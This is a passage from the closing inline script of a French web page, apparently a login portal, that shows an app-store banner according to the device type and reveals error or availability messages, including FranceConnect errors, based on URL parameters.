									$("#leStoreLogo").html('<img id="LogoSmartImage" src="images/Small-logoSMART.png" alt="T&eacute;l&eacute;charger l\'app mobile" />');
									deleteClassName(document.getElementById('banniereSmart'), 'hide');
									document.getElementById('leStoreLogo').href=storeAndroidURL;
								}
				
				
						}
					if (navigator.userAgent.match(/iPhone|iPad|iPod/i))
						{
							afficheSmartBanner_default=0;
							if (typeof(afficheSmartBanner)=='undefined') { var afficheSmartBanner=new Object();}
							if (!("apple" in afficheSmartBanner)) { afficheSmartBanner["apple"]=afficheSmartBanner_default ; }
							if (afficheSmartBanner["apple"]==1)
								{
									deleteClassName(document.getElementById('banniereSmart'), 'hide');
									document.getElementById('leStoreLogo').href=storeAppleURL;
								}
						}
					if (navigator.userAgent.match(/Windows Phone/i))
						{
							afficheSmartBanner_default=0;
							if (typeof(afficheSmartBanner)=='undefined') { var afficheSmartBanner=new Object();}
							if (!("wphone" in afficheSmartBanner)) { afficheSmartBanner["wphone"]=afficheSmartBanner_default ; }
							if (typeof(afficheSmartBanner["wphone"])=='undefined') { afficheSmartBanner["wphone"]=afficheSmartBanner_default;}
							if (afficheSmartBanner["wphone"]==1)
								{
								deleteClassName(document.getElementById('banniereSmart'), 'hide');
								document.getElementById('leStoreLogo').href=storeWindowsPhoneURL;
								document.getElementById('LogoSmartImage').src='images/Small_ico_windows.png';
								}
						}
					function getURLParameter(name)
						{
							return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(location.search)||[,""])[1].replace(/\+/g, '%20'))||null;
						}
					isDenied=getURLParameter('denied');
					if(isDenied=='403')
						{
							deleteClassName(document.getElementById('Cat2Interdit'), 'hide');
						}
					isIndispo=getURLParameter('indispo');
					if(isIndispo== '3S')
						{
							deleteClassName(document.getElementById('Cat2Indispo3S'), 'hide');
						}
					if(isIndispo== 'LMDP')
						{
							deleteClassName(document.getElementById('Cat2IndispoLMDP'), 'hide');
						}
					//FC Error
					errorFC=getURLParameter('fcError');
					if (errorFC==1) { deleteClassName(document.getElementById('Cat2FC1'), 'hide'); }
					if (errorFC==2) { deleteClassName(document.getElementById('Cat2FC2'), 'hide'); }
					if (errorFC==3) { deleteClassName(document.getElementById('Cat2FC3'), 'hide'); }
					withFC=getURLParameter('withFC');
					if (withFC==1) {
						deleteClassName(document.getElementById("FranceConnect"),"hide");
					}
					//Deco
					
					
				
		</script>
	</body>
</html>
